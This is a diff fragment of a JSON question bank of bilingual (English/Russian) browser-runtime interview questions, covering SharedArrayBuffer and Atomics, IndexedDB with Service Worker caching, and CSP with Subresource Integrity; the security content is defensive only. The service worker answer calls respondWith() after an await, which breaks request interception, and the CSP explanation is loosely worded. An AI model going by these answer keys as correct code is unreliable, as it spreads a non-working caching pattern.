+      "en": "### SharedArrayBuffer & Atomics for Thread-Safe Access\n\nSharedArrayBuffer allows multiple workers to access the same memory region, while Atomics ensures atomic operations preventing race conditions. Atomics.wait() is preferred over spin-loops as it blocks efficiently and respects the event loop, reducing CPU waste.\n\n```typescript\nconst shared = new SharedArrayBuffer(4);\nconst view = new Int32Array(shared);\n\n// Worker 1: Wait for signal\nAtomics.wait(view, 0, 0); // Blocks until notified\nconsole.log('Resumed');\n\n// Worker 2: Signal\nAtomics.store(view, 0, 1);\nAtomics.notify(view, 0);\n```\n\n**Common interview trap:** Forgetting that SharedArrayBuffer requires Secure Context (HTTPS) and specific HTTP headers (Cross-Origin-Opener-Policy, Cross-Origin-Embedder-Policy) due to Spectre/Meltdown mitigations.",
+      "ru": "### SharedArrayBuffer & Atomics для потокобезопасного доступа\n\nSharedArrayBuffer позволяет нескольким workers получать доступ к одному региону памяти, а Atomics обеспечивает атомарные операции, предотвращая race conditions. Atomics.wait() предпочтительнее spin-loops, так как эффективно блокирует и уважает event loop, снижая нагрузку на CPU.\n\n```typescript\nconst shared = new SharedArrayBuffer(4);\nconst view = new Int32Array(shared);\n\n// Worker 1: Ждём сигнала\nAtomics.wait(view, 0, 0); // Блокирует до уведомления\nconsole.log('Возобновлено');\n\n// Worker 2: Отправляем сигнал\nAtomics.store(view, 0, 1);\nAtomics.notify(view, 0);\n```\n\n**Типичная ошибка:** Забывают, что SharedArrayBuffer требует Secure Context (HTTPS) и специальных HTTP-заголовков (Cross-Origin-Opener-Policy, Cross-Origin-Embedder-Policy) из-за защиты от Spectre/Meltdown."
+    },
+    "tags": [
+      "shared-array-buffer",
+      "atomics",
+      "web-workers",
+      "concurrency",
+      "security-headers"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-34",
+    "topicId": "browser-runtime",
+    "difficulty": "advanced",
+    "question": {
+      "en": "Design an IndexedDB caching strategy that handles offline scenarios, versioning, and quota management. How would you integrate this with Service Worker for optimal performance?",
+      "ru": "Спроектируйте стратегию кэширования IndexedDB, которая обрабатывает офлайн-сценарии, версионирование и управление квотой. Как интегрировать это с Service Worker для оптимальной производительности?"
+    },
+    "answer": {
+      "en": "### IndexedDB + Service Worker Caching Strategy\n\nUse IndexedDB for large structured data with versioning via schema migrations, and implement quota monitoring with StorageManager API. Service Worker intercepts requests and checks IndexedDB before network, returning stale-while-revalidate patterns.\n\n```typescript\n// Service Worker: Intercept & check IndexedDB\nself.addEventListener('fetch', async (event) => {\n  if (event.request.method === 'GET') {\n    const db = await openDB();\n    const cached = await db.get('data', event.request.url);\n    if (cached) return event.respondWith(new Response(cached.body));\n  }\n  event.respondWith(fetch(event.request));\n});\n\n// Check quota\nconst {quota, usage} = await navigator.storage.estimate();\n```\n\n**Common interview trap:** Assuming IndexedDB persists indefinitely—browsers can evict it under storage pressure; always implement eviction strategies and check StorageManager.persisted().",
+      "ru": "### Стратегия кэширования IndexedDB + Service Worker\n\nИспользуйте IndexedDB для больших структурированных данных с версионированием через миграции схемы, и мониторьте квоту с помощью StorageManager API. Service Worker перехватывает запросы и проверяет IndexedDB перед сетью, возвращая stale-while-revalidate паттерны.\n\n```typescript\n// Service Worker: Перехватываем и проверяем IndexedDB\nself.addEventListener('fetch', async (event) => {\n  if (event.request.method === 'GET') {\n    const db = await openDB();\n    const cached = await db.get('data', event.request.url);\n    if (cached) return event.respondWith(new Response(cached.body));\n  }\n  event.respondWith(fetch(event.request));\n});\n\n// Проверяем квоту\nconst {quota, usage} = await navigator.storage.estimate();\n```\n\n**Типичная ошибка:** Предполагать, что IndexedDB сохраняется бесконечно—браузеры могут удалить его при нехватке памяти; всегда реализуйте стратегии вытеснения и проверяйте StorageManager.persisted()."
+    },
+    "tags": [
+      "indexed-db",
+      "service-worker",
+      "offline-caching",
+      "quota-management",
+      "storage-api"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-35",
+    "topicId": "browser-runtime",
+    "difficulty": "advanced",
+    "question": {
+      "en": "Explain the CSP directive bypass attack vectors (script injection via eval, style-src, frame-src) and how to enforce a strict Content Security Policy. How does Subresource Integrity complement CSP?",
+      "ru": "Объясните векторы атак на CSP (инъекция скриптов через eval, style-src, frame-src) и как применить строгую Content Security Policy. Как Subresource Integrity дополняет CSP?"
+    },
+    "answer": {
+      "en": "### CSP Attack Vectors & Strict Enforcement\n\nCSP prevents inline scripts via `script-src 'none'` and `default-src 'none'`, blocks eval/Function with strict directives. Subresource Integrity (SRI) adds cryptographic hash verification: `<script integrity=\"sha384-...\">` ensures fetched resources match expected content, thwarting CDN compromises.\n\n```typescript\n// Strict CSP header\nContent-Security-Policy: default-src 'none'; \n  script-src 'self'; style-src 'self'; img-src 'self';\n\n// HTML with SRI\n<script src=\"https://cdn.example.com/app.js\" \n  integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\"></script>\n```\n\n**Common interview trap:** Believing CSP alone prevents XSS—it mitigates, not eliminates it; SRI only validates delivery, not script behavior; always combine with input sanitization.",
+      "ru": "### Векторы атак CSP и строгое применение\n\nCSP предотвращает встроенные скрипты через `script-src 'none'` и `default-src 'none'`, блокирует eval/Function строгими директивами. Subresource Integrity (SRI) добавляет криптографическую верификацию хешей: `<script integrity=\"sha384-...\">` гарантирует соответствие загруженного контента, предотвращая компрометацию CDN.\n\n```typescript\n// Строгий CSP заголовок\nContent-Security-Policy: default-src 'none'; \n  script-src 'self'; style-src 'self'; img-src 'self';\n\n// HTML с SRI\n<script src=\"https://cdn.example.com/app.js\" \n  integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\"></script>\n```\n\n**Типичная ошибка:** Верить, что CSP один предотвращает XSS—он только смягчает, не устраняет; SRI только проверяет доставку, не поведение скрипта; всегда комбинируйте с санитизацией входных данных."
+    },
+    "tags": [
+      "csp",
+      "content-security-policy",
+      "xss-prevention",
+      "subresource-integrity",
+      "security-headers"
+    ]
+  }
+]
